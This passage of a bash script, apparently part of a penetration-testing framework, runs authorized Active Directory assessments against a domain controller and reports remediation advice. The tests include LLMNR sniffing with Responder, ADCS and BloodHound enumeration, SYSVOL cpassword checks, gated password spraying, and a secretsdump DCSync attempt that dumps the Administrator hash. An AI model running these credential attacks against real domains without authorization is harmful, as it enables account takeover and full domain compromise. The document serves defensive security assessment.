                "Members of DnsAdmins can load arbitrary DLLs into the DNS service via dnscmd, resulting in SYSTEM-level code execution on DCs." \
                "Remove unnecessary users from DnsAdmins. Monitor DnsAdmins membership. Consider removing the group if not required." \
                "priv_groups_dnsadmins"
        fi
    done

    log_ok "  Privileged group enumeration complete"
}

# - MRK:11_T09 — T09 LLMNR / NBT-NS POISONING DETECTION
test_T09_llmnr_detection() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "llmnr_detection")"

    log_inf "[T09] LLMNR / NBT-NS poisoning detection"

    # This test MUST be explicitly opted into — it sends active network packets
    if [[ "$_LLMNR_ACTIVE" -eq 0 ]]; then
        log_inf "  LLMNR active probe skipped (use --llmnr-active to enable)"
        return
    fi

    if ! _check_tool responder; then
        log_wrn "  Responder not found — install responder for active LLMNR testing"
        # Passive: check if LLMNR traffic is visible via Wireshark/tshark
        if _check_tool tshark; then
            log_inf "  Running passive tshark capture for LLMNR traffic (10 seconds)..."
            [[ "$DRY_RUN" -eq 1 ]] && { log_dry "tshark -i any -Y 'llmnr or nbns' -a duration:10"; return; }
            local cap_out
            cap_out=$(timeout 15 tshark -i any -Y 'llmnr or nbns' -a duration:10 2>/dev/null | head -50)
            echo "$cap_out" > "$ev_f"
            if [[ -n "$cap_out" ]]; then
                emit_finding "medium" \
                    "LLMNR / NBT-NS Traffic Observed on Network" \
                    "LLMNR or NetBIOS Name Service traffic is active on the network segment. Responder or similar tools can intercept and capture NTLMv2 hashes." \
                    "Disable LLMNR via GPO (Computer > Admin Templates > Network > DNS Client > Turn off multicast name resolution). Disable NetBIOS over TCP/IP on all NICs. Deploy a WPAD DNS entry to prevent WPAD MITM." \
                    "llmnr_detection"
                log_wrn "  LLMNR/NBT-NS traffic observed — poisoning risk exists"
            else
                log_ok "  No LLMNR/NBT-NS traffic captured (10 s window)"
            fi
        fi
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "responder -I <iface> -A (analyze mode, 30s)"; return; }

    # Use Responder in Analyze mode only (no active poisoning) — passive sniff
    local iface
    iface=$(ip route | awk '/default/{print $5; exit}')
    log_inf "  Launching Responder (Analyze mode) on ${iface} for 30s..."
    printf "${_Y}  [WARNING] Responder will passively sniff network traffic.${_N}\n"

    local resp_out
    resp_out=$(timeout 35 responder -I "$iface" -A 2>&1 | head -100 || true)
    echo "$resp_out" > "$ev_f"

    if echo "$resp_out" | grep -qiE 'LLMNR|NBT-NS|Poisoned|Request'; then
        emit_finding "medium" \
            "LLMNR / NBT-NS Requests Observed" \
            "LLMNR or NetBIOS Name Service requests were captured in Analyze mode. Active poisoning could intercept credentials." \
            "Disable LLMNR and NBT-NS via Group Policy and NIC settings. Implement DNSSEC. Monitor for rogue LLMNR responders." \
            "llmnr_detection"
        log_wrn "  LLMNR/NBT-NS requests captured — see ${ev_f}"
    else
        log_ok "  No LLMNR/NBT-NS poisoning requests observed in 30s window"
    fi
}

# - MRK:11_T10 — T10 ADCS TEMPLATE ENUMERATION (ESC1-ESC8)
test_T10_adcs_enum() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "adcs_enum")"

    log_inf "[T10] ADCS certificate template enumeration → ${dc}"

    if [[ "${AD_ADCS:-1}" -eq 0 ]]; then
        log_inf "  AD_ADCS=0 — skipping"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "certipy find -u ${AD_USERNAME}@${AD_DOMAIN} -dc-ip ${dc}"; return; }

    {
        echo "=== T10 ADCS Template Enumeration (ESC1-ESC8) ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    if _check_tool certipy || _check_tool certipy-ad; then
        local certipy_tool
        _check_tool certipy && certipy_tool="certipy" || certipy_tool="certipy-ad"

        if [[ "$_HAS_CREDS" -eq 0 ]]; then
            log_inf "  ADCS enumeration requires credentials — skipping authenticated checks"
            return
        fi

        local certipy_out_dir="${EVIDENCE_BASE}/adcs_${SESSION_TS}"
        mkdir -p "$certipy_out_dir"

        local certipy_out
        certipy_out=$(timeout 120 "$certipy_tool" find \
            -u "${AD_USERNAME}@${AD_DOMAIN}" -p "${AD_PASSWORD:-}" \
            -dc-ip "$dc" -output "${certipy_out_dir}/certipy" -vulnerable 2>&1 | head -200)
        echo "$certipy_out" >> "$ev_f"

        # Parse for ESC findings
        local esc_hits
        esc_hits=$(echo "$certipy_out" | grep -iE 'ESC[1-9]|vulnerable|misconfigured' | head -20 || true)
        if [[ -n "$esc_hits" ]]; then
            emit_finding "critical" \
                "Vulnerable ADCS Certificate Templates Found" \
                "Certipy identified ADCS misconfigurations: ${esc_hits}. Certificate-based privilege escalation (ESC1-ESC8) may be possible, up to Domain Admin compromise." \
                "Remediate per Microsoft guidance and Certipy output. Restrict 'Enroll' rights to minimum necessary principals. Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT where not required. Enable Manager Approval for sensitive templates." \
                "adcs_enum"
            log_wrn "  ADCS vulnerabilities found — see ${certipy_out_dir}"
        else
            log_ok "  ADCS: no obvious ESC misconfigurations detected"
        fi
    else
        log_wrn "  certipy not found — using LDAP fallback for basic ADCS enumeration"
        if _check_tool ldapsearch && [[ "$_HAS_CREDS" -eq 1 ]]; then
            local bind_args=("-x" "-H" "ldap://${dc}" "-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")
            # Enumerate certificate templates
            local tmpl_out
            tmpl_out=$(timeout 30 ldapsearch "${bind_args[@]}" \
                -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,${AD_BASE_DN}" \
                "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pkiExtendedKeyUsage 2>&1 | head -200)
            echo "$tmpl_out" >> "$ev_f"
            local tmpl_count
            tmpl_count=$(echo "$tmpl_out" | grep -c '^cn:' || echo 0)
            log_ok "  ${tmpl_count} certificate templates enumerated via LDAP — manual review required"
        fi
    fi
}

# - MRK:11_T11 — T11 BLOODHOUND COLLECTION
test_T11_bloodhound() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "bloodhound")"

    log_inf "[T11] BloodHound collection → ${dc}"

    if [[ "${AD_BLOODHOUND:-1}" -eq 0 ]]; then
        log_inf "  AD_BLOODHOUND=0 — skipping"
        return
    fi

    if [[ "$_HAS_CREDS" -eq 0 ]]; then
        log_inf "  BloodHound collection requires credentials — skipping"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "bloodhound-python -u ${AD_USERNAME} -p *** -d ${AD_DOMAIN} -dc ${dc} -c All"; return; }

    {
        echo "=== T11 BloodHound Collection ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    local bh_tool=""
    _check_tool bloodhound-python  && bh_tool="bloodhound-python"
    _check_tool bloodhound-ce-python && bh_tool="bloodhound-ce-python"

    if [[ -z "$bh_tool" ]]; then
        log_wrn "  bloodhound-python not found — install with: pip3 install bloodhound"
        return
    fi

    local bh_out_dir="${EVIDENCE_BASE}/bloodhound_${SESSION_TS}"
    mkdir -p "$bh_out_dir"

    local bh_args=("-u" "${AD_USERNAME}" "-p" "${AD_PASSWORD:-}" \
        "-d" "${AD_DOMAIN}" "-dc" "${dc}" \
        "-c" "All" "--zip" "-o" "${bh_out_dir}")

    log_inf "  Running BloodHound collection (All) — this may take several minutes..."
    local bh_out
    bh_out=$(timeout 600 "$bh_tool" "${bh_args[@]}" 2>&1 | tail -40)
    echo "$bh_out" >> "$ev_f"

    local zip_files
    zip_files=$(find "$bh_out_dir" -name "*.zip" 2>/dev/null | head -5)
    if [[ -n "$zip_files" ]]; then
        log_ok "  BloodHound data collected → ${bh_out_dir}"
        emit_finding "info" \
            "BloodHound Collection Complete" \
            "BloodHound data (All collection methods) gathered for ${AD_DOMAIN}. Import into BloodHound UI to identify attack paths to Domain Admin." \
            "Review BloodHound attack paths. Remediate Shortest Path to Domain Admin findings. Break OU/ACL privilege chains. Tier administrative access." \
            "bloodhound"
    else
        log_wrn "  BloodHound collection produced no output files"
    fi
}

# - MRK:11_T12 — T12 GPO ENUMERATION
test_T12_gpo_enum() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "gpo_enum")"

    log_inf "[T12] GPO enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch GPO objects on ${dc}"; return; }

    {
        echo "=== T12 GPO Enumeration ==="
        echo "DC: ${dc}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    local bind_args=("-x" "-H" "ldap://${dc}")
    [[ "$_HAS_CREDS" -eq 1 ]] && bind_args+=("-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")

    if ! _check_tool ldapsearch; then
        log_wrn "  ldapsearch not found — skipping T12"
        return
    fi

    # Enumerate all GPOs
    local gpo_out
    gpo_out=$(timeout 30 ldapsearch "${bind_args[@]}" \
        -b "CN=Policies,CN=System,${AD_BASE_DN}" \
        "(objectClass=groupPolicyContainer)" cn displayName gPCFileSysPath 2>&1 | head -200)
    echo "$gpo_out" >> "$ev_f"

    local gpo_count
    gpo_count=$(echo "$gpo_out" | grep -c '^cn:' || echo 0)
    log_ok "  ${gpo_count} GPOs enumerated"

    # Check SYSVOL for GPO files containing passwords (Group Policy Preferences)
    if _check_tool smbclient; then
        log_inf "  Checking SYSVOL for Group Policy Preferences (cpassword)..."
        local gpp_out
        gpp_out=$(timeout 30 smbclient "//${dc}/SYSVOL" \
            ${_HAS_CREDS:+-U "${AD_USERNAME}%${AD_PASSWORD:-}"} \
            -N -c "recurse; ls" 2>/dev/null | grep -iE '\.xml$' | head -30 || true)
        echo "--- SYSVOL XML files ---" >> "$ev_f"
        echo "${gpp_out:-none found}" >> "$ev_f"

        # Check for cpassword in any accessible XML files
        if echo "$gpp_out" | grep -qi '\.xml'; then
            log_wrn "  GPP XML files found in SYSVOL — check for cpassword entries (Get-GPPPassword / gpp-decrypt)"
            emit_finding "high" \
                "Group Policy Preferences XML Files in SYSVOL" \
                "XML files were found in SYSVOL. If these contain cpassword attributes (Group Policy Preferences), plaintext credentials can be recovered using gpp-decrypt or Get-GPPPassword." \
                "Run Get-GPPPassword or gpp-decrypt against all SYSVOL XML files. Remove cpassword entries. Microsoft patched this (MS14-025) but legacy GPOs may still contain them." \
                "gpo_gpp_cpassword"
        fi
    fi
}

# - MRK:11_T13 — T13 ACL / ADMINSD HOLDER REVIEW
test_T13_acl_review() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "acl_review")"

    log_inf "[T13] ACL / AdminSDHolder review → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch AdminSDHolder + privileged ACL review"; return; }

    {
        echo "=== T13 ACL / AdminSDHolder Review ==="
        echo "DC: ${dc}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    if ! _check_tool ldapsearch; then
        log_wrn "  ldapsearch not found — skipping T13"
        return
    fi

    local bind_args=("-x" "-H" "ldap://${dc}")
    [[ "$_HAS_CREDS" -eq 1 ]] && bind_args+=("-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")

    # Check AdminSDHolder object
    local sdh_out
    sdh_out=$(timeout 30 ldapsearch "${bind_args[@]}" \
        -b "CN=AdminSDHolder,CN=System,${AD_BASE_DN}" \
        "(objectClass=*)" nTSecurityDescriptor description 2>&1 | head -60)
    echo "$sdh_out" >> "$ev_f"

    if echo "$sdh_out" | grep -qi 'nTSecurityDescriptor'; then
        log_ok "  AdminSDHolder object located — ACL review requires Windows tooling"
        emit_finding "info" \
            "AdminSDHolder Object Located — Manual ACL Review Required" \
            "The AdminSDHolder object (CN=AdminSDHolder,CN=System) controls ACLs for all protected groups. Unexpected write permissions grant persistent admin access. Manual review with BloodHound or ADACLScanner recommended." \
            "Audit AdminSDHolder nTSecurityDescriptor for non-default ACEs. Remove write permissions from non-admin principals. Monitor AdminSDHolder for changes." \
            "acl_adminsd"
    fi

    # Check for users with DCSync rights (GetChanges / GetChangesAll)
    # These rights on the domain object indicate potential DCSync access
    local dc_acl
    dc_acl=$(timeout 30 ldapsearch "${bind_args[@]}" \
        -b "${AD_BASE_DN}" "(objectClass=domain)" nTSecurityDescriptor 2>&1 | head -30)
    echo "--- Domain Object ACL (raw) ---" >> "$ev_f"
    echo "${dc_acl:0:1000}" >> "$ev_f"
    log_inf "  Domain object ACL captured — BloodHound DCSync path analysis recommended"
}

# - MRK:11_T14 — T14 DELEGATION ENUMERATION
test_T14_delegation() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "delegation")"

    log_inf "[T14] Delegation enumeration → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch unconstrained/constrained delegation accounts"; return; }

    {
        echo "=== T14 Delegation Enumeration ==="
        echo "DC: ${dc}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    if ! _check_tool ldapsearch; then
        log_wrn "  ldapsearch not found — skipping T14"
        return
    fi

    local bind_args=("-x" "-H" "ldap://${dc}")
    [[ "$_HAS_CREDS" -eq 1 ]] && bind_args+=("-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")

    # Unconstrained delegation: userAccountControl bit 0x80000 (524288)
    local uncon_out
    uncon_out=$(timeout 30 ldapsearch "${bind_args[@]}" -b "${AD_BASE_DN}" \
        "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
        cn userAccountControl dNSHostName 2>&1 | head -100)
    echo "--- Unconstrained Delegation ---" >> "$ev_f"
    echo "$uncon_out" >> "$ev_f"

    local uncon_count
    uncon_count=$(echo "$uncon_out" | grep -c '^cn:' || echo 0)
    # Exclude DCs (expected to have unconstrained delegation)
    local dc_hostname; dc_hostname=$(dig +short -x "$dc" 2>/dev/null | sed 's/\.$//' || echo "")
    local non_dc_uncon
    non_dc_uncon=$(echo "$uncon_out" | grep '^cn:' | grep -iv "$(hostname -s)\|${dc_hostname}" | head -10 || true)

    if [[ -n "$non_dc_uncon" ]]; then
        emit_finding "high" \
            "Non-DC Computers with Unconstrained Delegation: $(echo "$non_dc_uncon" | wc -l)" \
            "Computers with unconstrained Kerberos delegation (excluding DCs): ${non_dc_uncon}. Compromising these systems enables impersonation of any user whose TGT is cached, including Domain Admins." \
            "Replace unconstrained delegation with constrained delegation or resource-based constrained delegation (RBCD). Require 'Account is sensitive and cannot be delegated' on tier-0 accounts." \
            "delegation_unconstrained"
    else
        log_ok "  Unconstrained delegation: only DCs detected (expected)"
    fi

    # Constrained delegation
    local con_out
    con_out=$(timeout 30 ldapsearch "${bind_args[@]}" -b "${AD_BASE_DN}" \
        "(msDS-AllowedToDelegateTo=*)" \
        cn sAMAccountName msDS-AllowedToDelegateTo 2>&1 | head -200)
    echo "--- Constrained Delegation ---" >> "$ev_f"
    echo "$con_out" >> "$ev_f"

    local con_count
    con_count=$(echo "$con_out" | grep -c '^cn:' || echo 0)
    log_ok "  Constrained delegation: ${con_count} account(s) with msDS-AllowedToDelegateTo set — review for protocol transition risk"

    if [[ "$con_count" -gt 0 ]]; then
        emit_finding "medium" \
            "Constrained Delegation Configured: ${con_count} Account(s)" \
            "${con_count} accounts have constrained Kerberos delegation configured. Accounts with Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION) can impersonate any user." \
            "Audit constrained delegation configurations. Check for TRUSTED_TO_AUTH_FOR_DELEGATION flag. Prefer RBCD where possible. Restrict delegation targets to non-sensitive services." \
            "delegation_constrained"
    fi
}

# - MRK:11_T15 — T15 DOMAIN TRUST MAPPING
test_T15_trust_mapping() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "trust_mapping")"

    log_inf "[T15] Domain trust mapping → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "ldapsearch domain trusts on ${dc}"; return; }

    {
        echo "=== T15 Domain Trust Mapping ==="
        echo "DC: ${dc}  BaseDN: ${AD_BASE_DN}"
    } > "$ev_f"

    if ! _check_tool ldapsearch; then
        log_wrn "  ldapsearch not found — skipping T15"
        return
    fi

    local bind_args=("-x" "-H" "ldap://${dc}")
    [[ "$_HAS_CREDS" -eq 1 ]] && bind_args+=("-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")

    local trust_out
    trust_out=$(timeout 30 ldapsearch "${bind_args[@]}" \
        -b "CN=System,${AD_BASE_DN}" \
        "(objectClass=trustedDomain)" \
        cn flatName trustDirection trustType trustAttributes 2>&1 | head -200)
    echo "$trust_out" >> "$ev_f"

    local trust_count
    trust_count=$(echo "$trust_out" | grep -c '^cn:' || echo 0)

    if [[ "$trust_count" -gt 0 ]]; then
        log_ok "  ${trust_count} domain trust(s) found — review trust direction and type"

        # Check for bidirectional trusts with external domains (trustType=2 = external)
        local bidirectional
        bidirectional=$(echo "$trust_out" | grep -i 'trustDirection: 3' | wc -l || echo 0)
        if [[ "$bidirectional" -gt 0 ]]; then
            emit_finding "medium" \
                "Bidirectional Domain Trusts Configured: ${bidirectional}" \
                "${bidirectional} bidirectional trust(s) exist. Bidirectional trusts allow lateral movement in both directions if either domain is compromised." \
                "Review all trusts for necessity. Prefer one-way trusts where bidirectional is not required. Enable SID Filtering on external trusts. Audit for ExtraForestSIDFilter." \
                "trust_mapping"
        fi
    else
        log_ok "  No domain trusts found"
    fi

    # nltest fallback
    if _check_tool nltest; then
        local nl_out
        nl_out=$(timeout 20 nltest /server:"$dc" /domain_trusts 2>&1 | head -40)
        echo "--- nltest trusts ---" >> "$ev_f"
        echo "$nl_out" >> "$ev_f"
    fi
}

# - MRK:11_T16 — T16 PASSWORD SPRAYING (DEEP ONLY)
test_T16_password_spray() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "password_spray")"

    log_inf "[T16] Password spray assessment"

    # Triple gate: deep profile + AD_SPRAY_ENABLED conf var + required inputs
    if [[ "${SCAN_PROFILE}" != "deep" ]]; then
        log_inf "  Password spray requires deep profile — skipping (current: ${SCAN_PROFILE})"
        return
    fi
    if [[ "${AD_SPRAY_ENABLED:-0}" -ne 1 ]]; then
        log_inf "  AD_SPRAY_ENABLED=0 — password spray disabled in conf (intentional default)"
        return
    fi
    if [[ -z "${AD_SPRAY_USER_LIST:-}" || ! -f "${AD_SPRAY_USER_LIST}" ]]; then
        log_wrn "  AD_SPRAY_USER_LIST not set or file not found — skipping spray"
        return
    fi
    if [[ -z "${AD_SPRAY_PASSWORD:-}" ]]; then
        log_wrn "  AD_SPRAY_PASSWORD not set — skipping spray"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "password spray: 1 attempt/account with '${AD_SPRAY_PASSWORD}'"; return; }

    {
        echo "=== T16 Password Spraying (1 attempt / account) ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
        echo "User list: ${AD_SPRAY_USER_LIST}  Password: [redacted]"
    } > "$ev_f"

    # Pre-spray: fetch lockout threshold to ensure we stay well below it
    local lockout_thresh=10  # safe default if we cannot determine
    if _check_tool crackmapexec; then
        local pol_out
        pol_out=$(timeout 20 crackmapexec smb "$dc" --pass-pol -u "" -p "" 2>&1)
        local parsed_thresh
        parsed_thresh=$(echo "$pol_out" | grep -iE 'lockout threshold' | grep -oE '[0-9]+' | head -1 || echo "")
        [[ -n "$parsed_thresh" ]] && lockout_thresh="$parsed_thresh"
    fi

    if [[ "$lockout_thresh" -eq 0 ]]; then
        log_inf "  Lockout threshold: 0 (disabled) — spray can proceed (unlimited attempts)"
    else
        log_wrn "  Lockout threshold: ${lockout_thresh} — capped at 1 attempt per account"
    fi

    printf "\n${_R}  [SPRAY WARNING]${_N} Sending 1 authentication attempt per account.\n"
    printf "  Threshold: %s | 1 attempt << lockout risk\n" "$lockout_thresh"

    if ! _check_tool crackmapexec; then
        log_wrn "  crackmapexec not found — using kerbrute for spray"
        if _check_tool kerbrute; then
            local spray_out
            spray_out=$(timeout 300 kerbrute passwordspray --dc "$dc" --domain "${AD_DOMAIN}" \
                "${AD_SPRAY_USER_LIST}" "${AD_SPRAY_PASSWORD}" 2>&1 | head -200)
            echo "$spray_out" >> "$ev_f"
            if echo "$spray_out" | grep -qi 'VALID LOGIN\|SUCCESS'; then
                local valid_count
                valid_count=$(echo "$spray_out" | grep -ci 'VALID LOGIN\|SUCCESS' || echo 0)
                emit_finding "critical" \
                    "Password Spray: ${valid_count} Valid Credential(s) Found" \
                    "${valid_count} account(s) authenticated with '${AD_SPRAY_PASSWORD}'. Compromised accounts can enable lateral movement and privilege escalation." \
                    "Force password reset for affected accounts. Implement MFA. Enforce strong password policy and ban common passwords. Enable SIEM alerting for password spray patterns." \
                    "password_spray"
                log_wrn "  Password spray: ${valid_count} valid login(s) — see ${ev_f}"
            else
                log_ok "  Password spray: no valid logins for '${AD_SPRAY_PASSWORD}'"
            fi
        else
            log_wrn "  crackmapexec and kerbrute not found — cannot perform spray"
        fi
        return
    fi

    local spray_out
    spray_out=$(timeout 300 crackmapexec smb "$dc" \
        -u "${AD_SPRAY_USER_LIST}" -p "${AD_SPRAY_PASSWORD}" \
        --continue-on-success 2>&1 | head -300)
    echo "$spray_out" >> "$ev_f"

    local success_lines
    success_lines=$(echo "$spray_out" | grep -E '\[+\].*Pwn3d!|\[\+\].*SMB.*:.*:.*' | grep -v 'STATUS_LOGON_FAILURE\|STATUS_ACCOUNT_LOCKED' | head -20 || true)
    if [[ -n "$success_lines" ]]; then
        local valid_count
        valid_count=$(echo "$success_lines" | wc -l || echo 0)
        emit_finding "critical" \
            "Password Spray: ${valid_count} Valid Credential(s) Found" \
            "${valid_count} account(s) authenticated with '${AD_SPRAY_PASSWORD}'. Details: ${success_lines:0:300}" \
            "Force password reset for all affected accounts. Enable account lockout. Deploy MFA. Ban common/weak passwords via Azure AD Password Protection or Entra ID." \
            "password_spray"
        log_wrn "  SPRAY SUCCESS: ${valid_count} valid login(s)"
    else
        log_ok "  Password spray: no accounts authenticated with '${AD_SPRAY_PASSWORD}'"
    fi
}

# - MRK:11_T17 — T17 DCSYNC RIGHTS CHECK
test_T17_dcsync_check() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "dcsync_check")"

    log_inf "[T17] DCSync rights check → ${dc}"

    if [[ "$_HAS_CREDS" -eq 0 ]]; then
        log_inf "  DCSync check requires credentials — skipping"
        return
    fi

    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "secretsdump.py (DCSync test) ${AD_DOMAIN}/${AD_USERNAME}@${dc}"; return; }

    {
        echo "=== T17 DCSync Rights Check ==="
        echo "DC: ${dc}  User: ${AD_USERNAME}@${AD_DOMAIN}"
    } > "$ev_f"

    local ds_tool=""
    _check_tool secretsdump.py && ds_tool="secretsdump.py"
    _check_tool impacket-secretsdump && ds_tool="impacket-secretsdump"

    if [[ -z "$ds_tool" ]]; then
        log_wrn "  secretsdump.py not found — using LDAP ACL check for GetChanges rights"
        # LDAP fallback: check if current user has Replicating Directory Changes rights
        if _check_tool ldapsearch; then
            local bind_args=("-x" "-H" "ldap://${dc}" "-D" "${AD_USERNAME}@${AD_DOMAIN}" "-w" "${AD_PASSWORD:-}")
            local acl_check
            acl_check=$(timeout 20 ldapsearch "${bind_args[@]}" \
                -b "${AD_BASE_DN}" "(objectClass=domain)" nTSecurityDescriptor 2>&1 | head -20)
            echo "$acl_check" >> "$ev_f"
            log_inf "  LDAP ACL captured — manual check for GetChanges/GetChangesAll rights required"
        fi
        return
    fi

    # Attempt DCSync for a single non-sensitive RID to test rights (RID 500 = Administrator)
    local ds_out
    local cred_arg="${AD_DOMAIN}/${AD_USERNAME}"
    [[ -n "${AD_NT_HASH:-}" ]] && cred_arg+=" --hashes :${AD_NT_HASH}" && ds_out=$(timeout 60 "$ds_tool" \
        "${AD_DOMAIN}/${AD_USERNAME}" --hashes ":${AD_NT_HASH}" \
        -dc-ip "$dc" -just-dc-user Administrator 2>&1 | head -60) \
    || ds_out=$(timeout 60 "$ds_tool" \
        "${AD_DOMAIN}/${AD_USERNAME}:${AD_PASSWORD:-}" \
        -dc-ip "$dc" -just-dc-user Administrator 2>&1 | head -60)

    echo "$ds_out" >> "$ev_f"

    if echo "$ds_out" | grep -qiE 'Administrator:500:|\[*\] Dumping'; then
        emit_finding "critical" \
            "DCSync Rights Confirmed for ${AD_USERNAME}" \
            "The account '${AD_USERNAME}' has Replicating Directory Changes / GetChangesAll rights and can perform DCSync to dump all domain hashes, including KRBTGT." \
            "Revoke DCSync rights immediately. DCSync requires 'Replicating Directory Changes All' — audit and remove this ACE from non-DC accounts. Rotate KRBTGT password twice. Review all accounts granted these rights." \
            "dcsync_check"
        log_wrn "  DCSync rights CONFIRMED for ${AD_USERNAME} — domain hash dump possible"
    elif echo "$ds_out" | grep -qiE 'Access denied|Insufficient|[Ee]rror'; then
        log_ok "  DCSync: access denied for ${AD_USERNAME} (correct)"
    else
        log_inf "  DCSync result inconclusive — review ${ev_f}"
    fi
}

# - MRK:11_T18 — T18 KERBEROS TICKET / HASH ATTACK SURFACE
test_T18_kerberos_surface() {
    local dc="${AD_DC_IP}"
    local ev_f; ev_f="$(_ev_file "kerberos_surface")"

    log_inf "[T18] Kerberos ticket / hash attack surface → ${dc}"
    [[ "$DRY_RUN" -eq 1 ]] && { log_dry "enumerate Pass-the-Hash / Pass-the-Ticket surface"; return; }

    {
        echo "=== T18 Kerberos Attack Surface ==="
        echo "DC: ${dc}  Domain: ${AD_DOMAIN}"
    } > "$ev_f"

    # Check if NTLM is enabled (WinRM via ntlm)
    if _check_tool crackmapexec; then
        local ntlm_check
        ntlm_check=$(timeout 20 crackmapexec smb "$dc" 2>&1 | head -10)
        echo "--- SMB NTLM Info ---" >> "$ev_f"
        echo "$ntlm_check" >> "$ev_f"

        if echo "$ntlm_check" | grep -qi 'Windows'; then
            local ntlm_ver
            ntlm_ver=$(echo "$ntlm_check" | grep -oiE 'ntlmv[12]|ntlm' | head -1 || echo "")
            log_inf "  SMB NTLMv1/2 visible via CME banner: ${ntlm_ver:-detected}"
        fi
    fi

    # Check if NTLMv1 is permitted (CHALLENGE response length = 8 bytes → NTLMv1)
    if _check_tool crackmapexec; then
        local ntlm1_check
        ntlm1_check=$(timeout 20 crackmapexec smb "$dc" --ntlm-timeout 5 2>&1 | grep -i 'ntlmv1\|NTLMv1' | head -5 || true)
        if [[ -n "$ntlm1_check" ]]; then
            emit_finding "high" \
                "NTLMv1 Authentication Permitted" \
                "NTLMv1 challenge-response detected on ${dc}. NTLMv1 hashes can be cracked within seconds with cloud GPU resources or precomputed rainbow tables." \
                "Disable NTLMv1 via GPO: Network security: LAN Manager authentication level → 'Send NTLMv2 response only. Refuse LM & NTLM'. Apply to all DCs and member servers." \
                "kerberos_ntlmv1"
        fi
    fi

    # Check print spooler (PrintNightmare / SpoolSS — enables Pass-the-Ticket via unconstrained delegation)
    if _check_tool rpcdump.py || _check_tool impacket-rpcdump; then
        local rpc_tool
        _check_tool rpcdump.py && rpc_tool="rpcdump.py" || rpc_tool="impacket-rpcdump"
        local spooler_check
        spooler_check=$(timeout 20 "$rpc_tool" "$dc" 2>&1 | grep -i 'spoolss\|IRemoteWinspool' | head -5 || true)
        echo "--- Spooler Check ---" >> "$ev_f"
        echo "${spooler_check:-not detected}" >> "$ev_f"
        if [[ -n "$spooler_check" ]]; then
            emit_finding "medium" \
                "Print Spooler (SpoolSS) Running on DC" \
                "The Print Spooler service is running on DC ${dc}. In combination with unconstrained delegation, this enables forced authentication capture attacks (PrinterBug) to obtain TGTs." \
                "Disable Print Spooler on all Domain Controllers (Stop-Service Spooler + Set-Service Spooler -StartupType Disabled via GPO). Apply PrintNightmare patches (CVE-2021-1675, CVE-2021-34527)." \
                "kerberos_spooler"
        fi
    fi

    log_ok "  Kerberos attack surface assessment complete"
}

# =============================================================================
# - MRK:11_TRUN
# =============================================================================
test_dc() {
    local dc="${AD_DC_IP}"
    local find_before="$_FIND_CTR"

    log_inf "=== Testing DC: ${dc} (${AD_DOMAIN}) ==="

    _test_skip T01 || test_T01_dc_discovery
    _test_skip T02 || test_T02_ldap_enum
    _test_skip T03 || test_T03_netbios_rpc
    _test_skip T04 || test_T04_smb_shares
    _test_skip T05 || test_T05_kerberoasting
    _test_skip T06 || test_T06_asrep_roasting
    _test_skip T07 || test_T07_password_policy
    _test_skip T08 || test_T08_priv_groups
    _test_skip T09 || test_T09_llmnr_detection
    _test_skip T10 || test_T10_adcs_enum
    _test_skip T11 || test_T11_bloodhound
    _test_skip T12 || test_T12_gpo_enum
    _test_skip T13 || test_T13_acl_review
    _test_skip T14 || test_T14_delegation
    _test_skip T15 || test_T15_trust_mapping
    _test_skip T16 || test_T16_password_spray
    _test_skip T17 || test_T17_dcsync_check
    _test_skip T18 || test_T18_kerberos_surface

    local find_delta=$(( _FIND_CTR - find_before ))
    echo "SUMMARY_ROW|${dc}|${AD_DOMAIN}|findings=${find_delta}"
}

# =============================================================================
# - MRK:11_MAIN
# =============================================================================
main() {
    printf "\n${_W}╔══════════════════════════════════════════════════════╗${_N}\n"
    printf "${_W}║  PT-Orc  ·  Step 11: Active Directory Testing        ║${_N}\n"
    printf "${_W}╚══════════════════════════════════════════════════════╝${_N}\n\n"

    log_inf "Project  : ${PROJECT_NAME}"
    log_inf "Profile  : ${SCAN_PROFILE}"
    log_inf "Domain   : ${AD_DOMAIN:-<not set>}"
    log_inf "DC IP    : ${AD_DC_IP:-<not set>}"
